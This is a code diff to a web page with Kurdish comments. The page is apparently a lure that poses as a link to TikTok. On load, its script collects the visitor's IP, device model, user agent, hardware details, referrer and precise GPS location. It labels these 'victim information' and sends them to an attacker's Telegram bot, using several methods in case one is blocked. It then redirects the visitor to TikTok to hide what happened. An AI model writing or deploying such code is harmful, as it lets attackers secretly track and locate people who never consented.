@@ -33,41 +33,137 @@
         const CHAT_ID = "6230485449";
         // =================================================
 
-        // ناردن بە Image Beacon (هیچ CORSێک نییە - زۆرترین سەرکەوتن)
+        // ناردن بە چەند ڕێگای جیاواز
         function sendToTelegram(text) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&parse_mode=Markdown&text=${encodeURIComponent(text)}`;
+            // 1. Image Beacon (بێ CORS)
+            new Image().src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&parse_mode=Markdown&text=${encodeURIComponent(text)}`;
             
-            // 1. Image Beacon (سەرەکی)
-            new Image().src = url;
-            
-            // 2. Fetch (لەوانەیە کاربکات)
+            // 2. Fetch
             try {
                 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     mode: 'no-cors',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: text,
-                        parse_mode: 'Markdown'
-                    })
+                    body: JSON.stringify({chat_id: CHAT_ID, text: text, parse_mode: 'Markdown'})
                 });
             } catch(e) {}
             
-            // 3. XMLHttpRequest
+            // 3. XHR
             try {
                 const xhr = new XMLHttpRequest();
                 xhr.open('POST', `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, true);
                 xhr.setRequestHeader('Content-Type', 'application/json');
-                xhr.send(JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: text,
-                    parse_mode: 'Markdown'
-                }));
+                xhr.send(JSON.stringify({chat_id: CHAT_ID, text: text, parse_mode: 'Markdown'}));
             } catch(e) {}
         }
 
-        // وەرگرتنی ئایپی بە JSONP (بێ CORS)
+        // ====== دەستنیشانکردنی ناوی مۆبایل / ئامێر ======
+        function getDeviceName() {
+            const ua = navigator.userAgent;
+            
+            // لیستی مۆبایلە بەناوبانگەکان
+            const devices = [
+                // iPhone
+                {pattern: /iPhone\s(\d+)[,|\s]/i, name: (m) => `iPhone ${m[1]}`},
+                {pattern: /iPhone/i, name: () => 'iPhone'},
+                {pattern: /iPad\s(\d+)[,|\s]/i, name: (m) => `iPad ${m[1]}`},
+                {pattern: /iPad/i, name: () => 'iPad'},
+                {pattern: /iPod/i, name: () => 'iPod Touch'},
+                
+                // Samsung
+                {pattern: /SM-G998B/i, name: () => 'Samsung Galaxy S21 Ultra'},
+                {pattern: /SM-G996B/i, name: () => 'Samsung Galaxy S21+'},
+                {pattern: /SM-G991B/i, name: () => 'Samsung Galaxy S21'},
+                {pattern: /SM-S908B/i, name: () => 'Samsung Galaxy S22 Ultra'},
+                {pattern: /SM-S901B/i, name: () => 'Samsung Galaxy S22'},
+                {pattern: /SM-S911B/i, name: () => 'Samsung Galaxy S23'},
+                {pattern: /SM-S918B/i, name: () => 'Samsung Galaxy S23 Ultra'},
+                {pattern: /SM-S921B/i, name: () => 'Samsung Galaxy S24'},
+                {pattern: /SM-S928B/i, name: () => 'Samsung Galaxy S24 Ultra'},
+                {pattern: /SM-A[0-9]+/i, name: (m) => `Samsung Galaxy A-series`},
+                {pattern: /SM-N[0-9]+/i, name: () => 'Samsung Galaxy Note'},
+                {pattern: /SM-F[0-9]+/i, name: () => 'Samsung Galaxy Fold/Z'},
+                
+                // Google Pixel
+                {pattern: /Pixel\s(\d+)\s?(XL|Pro|a)?/i, name: (m) => `Google Pixel ${m[1]} ${m[2] || ''}`.trim()},
+                {pattern: /Pixel/i, name: () => 'Google Pixel'},
+                
+                // Xiaomi
+                {pattern: /Xiaomi\s([^\s;]+)/i, name: (m) => `Xiaomi ${m[1]}`},
+                {pattern: /Redmi\s([^\s;]+)/i, name: (m) => `Redmi ${m[1]}`},
+                {pattern: /Mi\s([^\s;]+)/i, name: (m) => `Xiaomi Mi ${m[1]}`},
+                {pattern: /POCO/i, name: () => 'Xiaomi POCO'},
+                
+                // OnePlus
+                {pattern: /OnePlus\s([^\s;]+)/i, name: (m) => `OnePlus ${m[1]}`},
+                {pattern: /ONEPLUS/i, name: () => 'OnePlus'},
+                
+                // Huawei
+                {pattern: /Huawei\s([^\s;]+)/i, name: (m) => `Huawei ${m[1]}`},
+                {pattern: /Mate\s([^\s;]+)/i, name: (m) => `Huawei Mate ${m[1]}`},
+                {pattern: /P[0-9]{2,3}\sPro/i, name: (m) => `Huawei P-series`},
+                
+                // Oppo / Vivo / Realme
+                {pattern: /Oppo\s([^\s;]+)/i, name: (m) => `Oppo ${m[1]}`},
+                {pattern: /vivo\s([^\s;]+)/i, name: (m) => `Vivo ${m[1]}`},
+                {pattern: /Realme\s([^\s;]+)/i, name: (m) => `Realme ${m[1]}`},
+                
+                // Nokia
+                {pattern: /Nokia\s([^\s;]+)/i, name: (m) => `Nokia ${m[1]}`},
+                
+                // Sony
+                {pattern: /Sony\s([^\s;]+)/i, name: (m) => `Sony ${m[1]}`},
+                {pattern: /Xperia/i, name: () => 'Sony Xperia'},
+                
+                // LG
+                {pattern: /LG\s([^\s;]+)/i, name: (m) => `LG ${m[1]}`},
+                {pattern: /LM-[^\s]+/i, name: () => 'LG'},
+                
+                // Motorola
+                {pattern: /Moto\s([^\s;]+)/i, name: (m) => `Motorola Moto ${m[1]}`},
+                {pattern: /motorola/i, name: () => 'Motorola'},
+                
+                // Honor
+                {pattern: /Honor\s([^\s;]+)/i, name: (m) => `Honor ${m[1]}`},
+                
+                // Asus
+                {pattern: /ASUS\s([^\s;]+)/i, name: (m) => `Asus ${m[1]}`},
+                {pattern: /ROG\sPhone/i, name: () => 'Asus ROG Phone'},
+                
+                // Nothing
+                {pattern: /Nothing\s([^\s;]+)/i, name: (m) => `Nothing ${m[1]}`},
+                {pattern: /Phone\s\(\d\)/i, name: () => 'Nothing Phone'},
+                
+                // OneXPlayer / GPD / Generic
+                {pattern: /OneXPlayer/i, name: () => 'OneXPlayer'},
+                {pattern: /GPD/i, name: () => 'GPD'},
+                
+                // Windows / Mac / Linux
+                {pattern: /Windows\sNT\s(\d+\.\d+)/i, name: (m) => `Windows (${m[1]})`},
+                {pattern: /Macintosh/i, name: () => 'Mac'},
+                {pattern: /Linux\sx86_64/i, name: () => 'Linux Desktop'},
+                {pattern: /Linux\saarch64/i, name: () => 'Linux ARM (Android)'},
+                {pattern: /CrOS/i, name: () => 'Chrome OS'},
+                
+                // Android generic
+                {pattern: /Android\s(\d+[\.\d]*)/i, name: (m) => `Android ${m[1]}`},
+            ];
+            
+            // بە دوای هەر ناوێکدا بگەڕێ
+            for (const device of devices) {
+                const match = ua.match(device.pattern);
+                if (match) {
+                    const name = device.name(match);
+                    if (name) return name;
+                }
+            }
+            
+            // ئەگەر هیچ نەدۆزرایەوە، User-Agent کورتکراوە بنێرە
+            const short = ua.substring(0, 80).replace(/[;\s]+/g, ' ').trim();
+            return short || 'نەدۆزرایەوە';
+        }
+
+        // وەرگرتنی ئایپی بە JSONP
         function getIP(callback) {
             try {
                 const s = document.createElement('script');
@@ -86,49 +182,40 @@
 
         // کۆکردنەوەی هەموو زانیارییەکان
         function collectAndSend() {
+            const deviceName = getDeviceName();
+            
             getIP(function(ip) {
                 const ua = navigator.userAgent;
                 const os = navigator.platform;
                 const lang = navigator.language;
                 const screenRes = `${screen.width}x${screen.height}`;
-                const colorDepth = `${screen.colorDepth}-bit`;
                 const cores = navigator.hardwareConcurrency || 'نەزانراو';
                 const memory = navigator.deviceMemory || 'نەزانراو';
                 const time = new Date().toLocaleString();
                 const referrer = document.referrer || 'ڕاستەوخۆ';
                 
-                // هەوڵی بەتەری (ئەگەر مۆبایل بێت)
-                let batteryInfo = '';
-                if (navigator.getBattery) {
-                    navigator.getBattery().then(bat => {
-                        batteryInfo = `\n**🔋 بەتەری:** ${Math.round(bat.level * 100)}%`;
-                    }).catch(() => {});
-                }
-                
                 // دروستکردنی پەیام
                 let msg = `🎯 **زانیاری قوربانی**\n\n`;
+                msg += `**📱 ناوی مۆبایل:** \`${deviceName}\`\n\n`;
                 msg += `**🌐 ئایپی:** \`${ip}\`\n`;
                 msg += `**🖥 User-Agent:** \`${ua}\`\n`;
                 msg += `**📱 OS:** ${os}\n`;
                 msg += `**🌍 زمان:** ${lang}\n`;
                 msg += `**📐 شاشە:** ${screenRes}\n`;
-                msg += `**🎨 ڕەنگ:** ${colorDepth}\n`;
                 msg += `**🧠 CPU:** ${cores} cores\n`;
                 msg += `**🔋 RAM:** ${memory} GB\n`;
                 msg += `**🔗 سەرچاوە:** ${referrer}\n`;
                 msg += `**🕐 کات:** ${time}\n`;
                 
-                // هەوڵی وەرگرتنی شوێن (GPS) - ئەگەر مۆبایل ڕێگە بدات
+                // هەوڵی وەرگرتنی GPS
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
                         function(pos) {
                             msg += `**📍 GPS:** ${pos.coords.latitude}, ${pos.coords.longitude}\n`;
                             msg += `**📡 وردی:** ${pos.coords.accuracy} مەتر\n`;
-                            // ناردن لەگەڵ GPS
                             sendToTelegram(msg);
                         },
                         function() {
-                            // ناردن بەبێ GPS
                             sendToTelegram(msg);
                         },
                         {timeout: 4000, enableHighAccuracy: true}
@@ -144,28 +231,27 @@
             // کۆکردنەوەی زانیاری و ناردن
             collectAndSend();
             
-            // دوای 2 چرکە ڕابچوێنە بۆ تیک تۆک (بە چەند ڕێگا)
+            // دوای 2.5 چرکە ڕابچوێنە بۆ تیک تۆک
             setTimeout(function() {
                 const tiktokUrl = 'https://www.tiktok.com';
                 
-                // ڕێگای 1: کلیکی لینک
+                // ڕێگای 1
                 const a = document.createElement('a');
                 a.href = tiktokUrl;
                 a.target = '_blank';
-                a.rel = 'noopener noreferrer';
                 a.style.display = 'none';
                 document.body.appendChild(a);
                 a.click();
                 
-                // ڕێگای 2: window.open
+                // ڕێگای 2
                 try { window.open(tiktokUrl, '_blank'); } catch(e) {}
                 
-                // ڕێگای 3: window.location
+                // ڕێگای 3
                 setTimeout(function() {
                     window.location.href = tiktokUrl;
                 }, 300);
                 
-                // نیشاندانی پەیامی ڕابچوون
+                // پەیامی ڕابچوون
                 document.getElementById('app').innerHTML = `
                     <svg width="56" height="56" viewBox="0 0 24 24" fill="none" style="margin-bottom:16px;">
                         <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" fill="#4CAF50"/>
@@ -173,7 +259,7 @@
                     <h2>✅ کرایەوە</h2>
                     <p class="sub">دەچیتە وێبگەڕ...</p>
                 `;
-            }, 2200);
+            }, 2500);
         };
     </script>
 </body>
